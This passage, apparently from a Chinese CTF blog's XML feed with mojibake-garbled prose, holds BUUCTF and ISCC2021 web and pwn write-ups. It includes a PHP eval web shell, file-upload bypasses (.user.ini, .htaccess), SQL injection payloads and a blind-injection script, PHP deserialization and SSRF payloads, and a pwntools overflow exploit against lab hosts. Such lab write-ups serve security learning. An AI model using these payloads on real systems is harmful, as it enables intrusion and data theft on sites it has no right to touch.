<p>æ›´æ”¹è„šæœ¬ä¸ºï¼š</p>
<script language="php">eval($_POST['a']);</script>

<p><img src="/2021/05/31/buuctf-web-1/image-20201130164606403.png" alt="image-20201130164606403"></p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201130164623359.png" alt="image-20201130164623359"></p>
<p>åº”è¯¥æ˜¯æ£€æŸ¥äº†æ–‡ä»¶å†…å®¹ï¼Œæ·»åŠ æ–‡ä»¶å¤´è¯•è¯•ã€‚</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201130164818010.png" alt="image-20201130164818010"></p>
<p>ä¸Šä¼ æˆåŠŸï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201130164841827.png" alt="image-20201130164841827"></p>
<p>è¿æ¥æœåŠ¡ç«¯ã€‚ä¸Šä¼ çš„æ–‡ä»¶åœ¨uploadæ–‡ä»¶å¤¹å†…ã€‚</p>
<p>å¾—åˆ°flagï¼š</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201130165424764.png" alt="image-20201130165424764"></p>
<h1 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h1><p>å‰ç«¯æ ¡éªŒï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201202193259648.png" alt="image-20201202193259648"></p>
<p>ä½¿ç”¨consoleé‡å†™å‡½æ•°ã€‚</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201202193717741.png" alt="image-20201202193717741"></p>
<p>ä¸Šä¼ åç¼€ä¸º.phtmlçš„ä¸€å¥è¯é©¬æ–‡ä»¶ã€‚</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201202193550210.png" alt="image-20201202193550210"></p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201202193649179.png" alt="image-20201202193649179"></p>
<p>èšå‰‘è¿æ¥ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201202194501924.png" alt="image-20201202194501924"></p>
<h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>ä¸Šä¼ .phpæ–‡ä»¶ï¼Œæ£€æŸ¥åç¼€äº†ï¼Œä¸Šä¼ .php.jpg,è¿‡äº†åç¼€æ£€æµ‹ï¼Œä½†æ˜¯å‘ç°æ£€æµ‹äº†æ–‡ä»¶å†…å®¹å’Œæ–‡ä»¶å¤´ï¼Œæœ€åä¸Šä¼ å¦‚ä¸‹æ–‡ä»¶ï¼š</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201202195431071.png" alt="image-20201202195431071"></p>
<p>ä½†æ˜¯é©¬ä¸ä¼šæ‰§è¡Œï¼Œè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š</p>
<p>.user.iniæ–‡ä»¶</p>
<p><a href="https://www.cnblogs.com/wangtanzhi/p/11862682.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/11862682.html</a></p>
<p>æ‰€ä»¥å†ä¼ ä¸€ä¸ªæ–‡ä»¶ï¼š</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201202202953314.png" alt="image-20201202202953314"></p>
<p>è¿æ¥èšå‰‘ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201202202934464.png" alt="image-20201202202934464"></p>
<h1 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h1><p>åœ¨é¡µé¢ä»£ç ä¸­æ‰¾åˆ°æ³„éœ²ä»£ç ï¼Œå¯†ç æ˜¯404ï¼Œä½†æ˜¯ä¸èƒ½æ˜¯æ•°å­—ï¼Œphpå¼±ç±»å‹ï¼Œä¼ å€¼404+å­—æ¯å³å¯ã€‚</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201211165613989.png" alt="image-20201211165613989"></p>
<p>ä½†æ˜¯moneyä¸èƒ½è¾“å…¥å¤ªé•¿çš„é•¿åº¦ã€‚</p>
<p>ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201211165910704.png" alt="image-20201211165910704"></p>
<h1 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h1><p>æŠ“åŒ…å‘ç°hint</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201211170243271.png" alt="image-20201211170243271"></p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201211171126357.png" alt="image-20201211171126357"></p>
<p>æ„é€ æ°¸çœŸè¯­å¥ï¼Œ</p>
<p>ffifdyopåŠ å¯†åä¸º276f722736c95d99e921722cf9ed621cï¼Œ276f722736å˜ä¸ºå­—ç¬¦ä¸²ä¸º<code>â€˜orâ€™6</code>ã€‚</p>
<p>æ‰€ä»¥å°±ç»•è¿‡äº†passwordçš„åˆ¤æ–­ã€‚</p>
<p>è¿›å…¥ä¸‹ä¸€ä¸ªé¡µé¢ï¼š</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201211171524480.png" alt="image-20201211171524480"></p>
<p>å¼±ç±»å‹æ¯”è¾ƒï¼Œ</p>
<p><code>a=QNKCDZO&amp;b=240610708</code></p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201211171659546.png" alt="image-20201211171659546"></p>
<p>æ•°ç»„ç»•è¿‡ï¼Œ</p>
<p>md5()è®¡ç®—çš„æ˜¯å­—ç¬¦ä¸²çš„å“ˆå¸Œå€¼ï¼Œå¯¹äºæ•°ç»„åˆ™è¿”å›falseï¼Œä¼ ä¸¤ä¸ªæ•°ç»„ï¼Œå¾—åˆ°ä¸¤ä¸ªFALSEç›¸ç­‰å¾—ä»¥ç»•è¿‡ã€‚</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201211172134343.png" alt="image-20201211172134343"></p>
<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p><img src="/2021/05/31/buuctf-web-1/image-20201230144638614.png" alt="image-20201230144638614"></p>
<p>éœ€è¦è¯»å–å†…å®¹ä¸ºwelcome to the zjctfï¼Œä½¿ç”¨dataåè®®å†™å…¥å†…å®¹ï¼Œ</p>
<p><code>text=data://text/plain,welcome to the zjctf</code></p>
<p>ç„¶åè¯»å–useless.php,è¯»å–phpæ–‡ä»¶éœ€è¦ä½¿ç”¨filteråè®®</p>
<p><code>php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p>å¾—åˆ°ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span></span><br><span class="line"><span class="php">        &#125;  </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>æœ€åæ˜¯ååºåˆ—åŒ–æ¼æ´ï¼Œå°†Flagç±»åºåˆ—åŒ–ï¼Œ</p>
<p><code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
<p>æœ€ç»ˆpayload</p>
<p><code>/?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
<p>è¦æ³¨æ„ç¬¬äºŒä¸ªå‚æ•°fileæ˜¯useless.phpï¼Œè¿™æ ·æ‰æ˜¯åŒ…å«ä¸€ä¸ªphpæ–‡ä»¶ï¼Œè€Œfilteråè®®è¯»å–çš„æ˜¯æºç æ–‡æœ¬ã€‚</p>
<p>å¾—åˆ°flagï¼š</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201230151427427.png" alt="image-20201230151427427"></p>
<h1 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h1><p>sqlæ³¨å…¥ï¼Œå…ˆæ¨¡ç³Šæµ‹è¯•ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªå­—ç¬¦ä¼šå¿½ç•¥ï¼Œæ‰€ä»¥ä»ç¬¬äºŒä¸ªå­—ç¬¦æµ‹è¯•ï¼Œ</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20201231183535996.png" alt="image-20201231183535996"></p>
<p>å‡½æ•°å‡ ä¹æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œä½¿ç”¨ç›²æ³¨ï¼Œ</p>
<p>äºŒåˆ†æ³•å†™çš„æœ‰ç‚¹é—®é¢˜ï¼Œç›´æ¥æšä¸¾å§ã€‚</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">time</span></span><br><span class="line">ss = string.printable</span><br><span class="line">url = <span class="string">'http://1b30c1b1-9655-4d76-9e6e-332ae83bf048.node3.buuoj.cn/index.php'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="built_in">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> ss:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)"</span> % (x, ord(i))</span><br><span class="line">        <span class="keyword">data</span> = &#123;</span><br><span class="line">            <span class="string">"id"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">time</span>.sleep(<span class="number">0.05</span>)</span><br><span class="line">        response = requests.post(url, <span class="keyword">data</span>=<span class="keyword">data</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello, glzjin wants a girlfriend.'</span> <span class="built_in">in</span> response.<span class="keyword">text</span>:</span><br><span class="line">            s = i</span><br><span class="line">            break</span><br><span class="line">    result += s</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>flag{3f3b99be-359b-4a5f-9fc6-0eb6f2c00474}</p>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h1><p>ç»è¿‡æµ‹è¯•å‘ç°æœ‰è¿‡æ»¤ï¼Œburpè¿›è¡Œfuzzã€‚</p>
<p>ç­‰å·ï¼Œç©ºæ ¼ï¼Œunion, *å·ç­‰è¢«è¿‡æ»¤ã€‚</p>
<p>ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œç©ºæ ¼ç”¨()ä»£æ›¿ã€‚</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="string">'or(extractvalue("anything",concat('</span>~<span class="string">',(database()))))#  </span></span><br><span class="line"><span class="string">------  geek</span></span><br><span class="line"><span class="string">'</span><span class="keyword">or</span>(extractvalue("anything",concat(<span class="string">'~'</span>,(<span class="keyword">select</span>(group_concat(<span class="built_in">table_name</span>))<span class="keyword">from</span>(information_schema.<span class="keyword">tables</span>)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="keyword">database</span>())))))#</span><br><span class="line"><span class="comment">------  H4rDsq1</span></span><br><span class="line"><span class="string">'or(extractvalue("anything",concat('</span>~<span class="string">',(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('</span>H4rDsq1<span class="string">')))))#</span></span><br><span class="line"><span class="string">-----   id,username,password</span></span><br><span class="line"><span class="string">'</span><span class="keyword">or</span>(extractvalue("anything",concat(<span class="string">'~'</span>,(<span class="keyword">select</span>(group_concat(username))<span class="keyword">from</span>(H4rDsq1)))))#</span><br><span class="line"><span class="comment">-----   flag</span></span><br><span class="line"><span class="string">'or(extractvalue("anything",concat('</span>~<span class="string">',(select(group_concat(password))from(H4rDsq1)))))#</span></span><br><span class="line"><span class="string">-----   flag&#123;181d97e5-323e-4358-866a-0c</span></span><br><span class="line"><span class="string">'</span><span class="keyword">or</span>(extractvalue("anything",concat(<span class="string">'~'</span>,(<span class="keyword">select</span>(group_concat(right(<span class="keyword">password</span>,<span class="number">20</span>)))<span class="keyword">from</span>(H4rDsq1)))))#</span><br><span class="line"><span class="comment">-----   8-866a-0c2c20dcb643&#125;</span></span><br></pre></td></tr></table></figure>

<p>flag{181d97e5-323e-4358-866a-0c2c20dcb643}</p>
<h1 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h1><p>robots.txtæºç æ³„æ¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  	<span class="comment">//åˆ›å»ºcurlèµ„æº</span></span><br><span class="line">      $ch = curl_init();</span><br><span class="line"></span><br><span class="line">      <span class="comment">//è®¾ç½®URLå’Œç›¸åº”çš„é€‰é¡¹</span></span><br><span class="line">      curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">      curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">      <span class="comment">//æŠ“å–URLå¹¶ä¼ é€’ç»™æµè§ˆå™¨</span></span><br><span class="line">      $output = curl_exec($ch);</span><br><span class="line">      $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">      <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//å…³é—­curlèµ„æºã€‚é‡Šæ”¾ç³»ç»Ÿèµ„æº</span></span><br><span class="line">      curl_close($ch);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> $output;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>SSRFï¼Œé€šè¿‡æœåŠ¡å™¨ä¼ªé€ æ¶æ„URLè¯»å–flag.phpã€‚</p>
<p>ç™»é™†ï¼Œåœ¨view.phpå‘ç°sqlæ³¨å…¥ã€‚</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>%20or%20extractvalue(<span class="string">"123"</span>,concat(%27~%27,(database())))<span class="comment">#</span></span><br><span class="line">--- fakebook</span><br><span class="line"><span class="number">1</span>%20or%20extractvalue(<span class="string">"123"</span>,concat(%27~%27,(<span class="keyword">select</span>%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())))<span class="comment">#</span></span><br><span class="line">--- users</span><br><span class="line"><span class="number">1</span>%20or%20extractvalue(<span class="string">"123"</span>,concat(%27~%27,(<span class="keyword">select</span>%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=<span class="string">"users"</span>)))<span class="comment">#</span></span><br><span class="line">--- <span class="keyword">no</span>,username,passwd,data,USER,CU</span><br><span class="line"><span class="number">1</span>%20or%20extractvalue(<span class="string">"123"</span>,concat(%27~%27,(<span class="keyword">select</span>%20group_concat(data)%20from%20users)))<span class="comment">#</span></span><br><span class="line"><span class="number">1</span>%20or%20extractvalue(<span class="string">"123"</span>,concat(%27~%27,<span class="keyword">substr</span>((<span class="keyword">select</span>%20data%20from%20users),<span class="number">20</span>,<span class="number">30</span>)))<span class="comment">#</span></span><br><span class="line">--- O:<span class="number">8</span>:<span class="string">"UserInfo"</span>:<span class="number">3</span>:&#123;<span class="keyword">s</span>:<span class="number">4</span>:<span class="string">"name"</span>;<span class="keyword">s</span>:<span class="number">3</span>:<span class="string">"123"</span>;<span class="keyword">s</span>:<span class="number">3</span>:<span class="string">"age"</span>;i:<span class="number">12</span>;<span class="keyword">s</span>:<span class="number">4</span>:<span class="string">"blog"</span>;<span class="keyword">s</span>:<span class="number">67</span>:<span class="string">"http://67c51528-60aa-442f-8197-40ccdd9a8971.node3.buuoj.cn/join.php"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>æ›´æ”¹dataæ•°æ®ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $name = <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $blog = <span class="string">"file:///var/www/html/flag.php"</span>;</span></span><br><span class="line"><span class="php">	</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> UserInfo();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">"UserInfo"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">1</span>:<span class="string">"1"</span>;s:<span class="number">3</span>:<span class="string">"age"</span>;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"blog"</span>;s:<span class="number">29</span>:<span class="string">"file:///var/www/html/flag.php"</span>;&#125;</span><br><span class="line"></span><br><span class="line">è”åˆæŸ¥è¯¢åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œ<span class="built_in">union</span> <span class="keyword">select</span>è¢«banï¼Œä½¿ç”¨<span class="built_in">union</span>/**/<span class="keyword">select</span>ç»•è¿‡</span><br><span class="line"><span class="number">0</span>%<span class="number">20</span><span class="built_in">union</span>/**/<span class="keyword">select</span>%<span class="number">201</span>,%<span class="number">202</span>,<span class="number">3</span>,'O:<span class="number">8</span>:<span class="string">"UserInfo"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">1</span>:<span class="string">"1"</span>;s:<span class="number">3</span>:<span class="string">"age"</span>;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"blog"</span>;s:<span class="number">29</span>:<span class="string">"file:///var/www/html/flag.php"</span>;&#125;'#</span><br></pre></td></tr></table></figure>

<p>flag{b908a76a-9666-4b0d-a5e9-c1f45b265f4e}</p>
<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username:  admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'admin'</span>,<span class="string">'68053af2923e00204c3ca7c6a3150cf7'</span><span class="comment">#</span></span><br><span class="line"><span class="keyword">password</span>:  <span class="number">789</span></span><br></pre></td></tr></table></figure>

<p>flag{03f63296-0154-4e71-9c57-54d3d44f71ad}</p>
<h1 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h1><p>ååºåˆ—åŒ–ï¼Œè¦ç»•è¿‡processã€‚</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20210518214941100.png" alt="image-20210518214941100"></p>
<p>ä¼ å…¥æ•°å­—2è¿›è¡Œç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content = <span class="string">"Hello World!"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">O:<span class="number">11</span>:<span class="string">"FileHandler"</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">"op"</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">"filename"</span>;s:<span class="number">57</span>:<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;s:<span class="number">7</span>:<span class="string">"content"</span>;s:<span class="number">12</span>:<span class="string">"Hello%20World!"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>flag{81940b5b-ace0-48ad-8403-3e605be41798}</p>
<h1 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h1><p>æ”¹ä¸ºjpgåç¼€ä¼ æ–‡ä»¶ï¼Œ</p>
<p>å†åˆ›å»º.htaccessæ–‡ä»¶ï¼Œå°†jpgè§£æä¸ºphpã€‚</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<p>ä¼ ä¸€å¥è¯é©¬ã€‚</p>
<p><img src="/2021/05/31/buuctf-web-1/image-20210518222025477.png" alt="image-20210518222025477"></p>
]]></content>
      <categories>
        <category>CTFèµ›é¢˜writeup</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-pwn-1</title>
    <url>/2021/05/31/buuctf-pwn-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p>11.28125è½¬ä¸ºäºŒè¿›åˆ¶</p>
<p><img src="/2021/05/31/buuctf-pwn-1/image-20201130202800389.png" alt="image-20201130202800389"></p>
<p>æ˜¾è€Œæ˜“è§ï¼Œ</p>
<p>æˆ‘ä»¬éœ€è¦å»è¦†ç›–v2ä¸º11.2815ï¼Œé¦–å…ˆéœ€è¦äº†è§£ä¸€ä¸‹æµ®ç‚¹æ•°è½¬16è¿›åˆ¶ã€‚</p>
<p><a href="https://www.cnblogs.com/mlgjb/p/8318436.html" target="_blank" rel="noopener">https://www.cnblogs.com/mlgjb/p/8318436.html</a></p>
<p>11.2815</p>
<p>11è½¬ä¸ºäºŒè¿›åˆ¶</p>
<p>1011</p>
<p>0.2815æ±‚å¾—äºŒè¿›åˆ¶</p>
<p>01100010000000100000000</p>
<p>æœ€åå¾—</p>
<p>01000001001101001000000000000000 è½¬ä¸º16è¿›åˆ¶ 0x41348000</p>
<p>exp:</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">27962</span>)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">'A'</span>*(<span class="number">0x30</span><span class="number">-4</span>) + p64(<span class="number">0x41348000</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.<span class="built_in">int</span>eractive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTFèµ›é¢˜writeup</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC2021å¨±ä¹</title>
    <url>/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰"><a href="#ISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰" class="headerlink" title="ISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰"></a>ISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰</h2><p><img src="/2021/05/31/ISCC2021å¨±ä¹/image-20210511204402437.png" alt="image-20210511204402437.png"></p>
<p>å°†ä¸¤ä¸ªç‚¹å‡»æ—¶é—´çš„IDäº’æ¢ã€‚</p>
<p><img src="/2021/05/31/ISCC2021å¨±ä¹/image-20210511204424387.png" alt="image-20210511204424387.png"></p>
<p>ISCC{1SCC_2o2l_KeFuu}</p>
<h2 id="è¿™æ˜¯å•¥"><a href="#è¿™æ˜¯å•¥" class="headerlink" title="è¿™æ˜¯å•¥"></a>è¿™æ˜¯å•¥</h2><p><img src="/2021/05/31/ISCC2021å¨±ä¹/image-20210511205142636.png" alt="image-20210511205142636.png"></p>
<p>å¤åˆ¶JSä»£ç ï¼Œæ§åˆ¶å°è¿è¡Œã€‚</p>
<p>ISCC{what_is*_jsJS&amp;}</p>
<h2 id="Web01"><a href="#Web01" class="headerlink" title="Web01"></a>Web01</h2><p><img src="/2021/05/31/ISCC2021å¨±ä¹/image-20210511210025764.png" alt="image-20210511210025764.png"></p>
<p>ç§‘å­¦è®¡æ•°æ³•ï¼Œ%00æˆªæ–­ã€‚</p>
<h2 id="ISCCå®¢æœä¸€å·å†²å†²å†²ï¼ˆäºŒï¼‰"><a href="#ISCCå®¢æœä¸€å·å†²å†²å†²ï¼ˆäºŒï¼‰" class="headerlink" title="ISCCå®¢æœä¸€å·å†²å†²å†²ï¼ˆäºŒï¼‰"></a>ISCCå®¢æœä¸€å·å†²å†²å†²ï¼ˆäºŒï¼‰</h2><h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="Mobile-Easy"><a href="#Mobile-Easy" class="headerlink" title="Mobile Easy"></a>Mobile Easy</h2><p><img src="/2021/05/31/ISCC2021å¨±ä¹/image-20210512175514207.png" alt="image-20210512175514207.png"></p>
<p>å¾—åˆ°secondStrï¼š+0dNlE8us8</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">8</span> == <span class="number">7</span> <span class="keyword">and</span> i % <span class="number">9</span> == <span class="number">8</span>:</span><br><span class="line">        print(chr(i), end="")</span><br><span class="line">print(chr(<span class="number">100</span>+<span class="number">3</span>))</span><br><span class="line">print(chr(<span class="number">100</span>^<span class="number">93</span>))</span><br><span class="line">print(chr((<span class="number">100</span>^<span class="number">93</span>)*<span class="number">2</span><span class="number">-10</span>))</span><br><span class="line">print(chr(<span class="number">120</span><span class="number">-1</span>))</span><br><span class="line">print(chr(<span class="number">80</span>+<span class="number">4</span>+<span class="number">24</span>))</span><br><span class="line"># <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">#     <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">#         <span class="keyword">if</span> i ^ j == <span class="number">56</span> <span class="keyword">and</span> i - j == <span class="number">24</span>:</span><br><span class="line">#             v10 = j</span><br><span class="line">#             print(chr(i),chr(j),end=",")</span><br><span class="line">print(chr(<span class="number">80</span>+<span class="number">4</span>))</span><br><span class="line">print(chr(<span class="number">80</span>))</span><br><span class="line">print(<span class="string">'ISCC&#123;+0dNlE8us8Gg9hwlTP&#125;'</span>.replace("dN", "B1").replace("8", "_").replace("P", "!").replace("hwl", "rea").replace(<span class="string">'u'</span>, <span class="string">'1'</span>).replace("+", 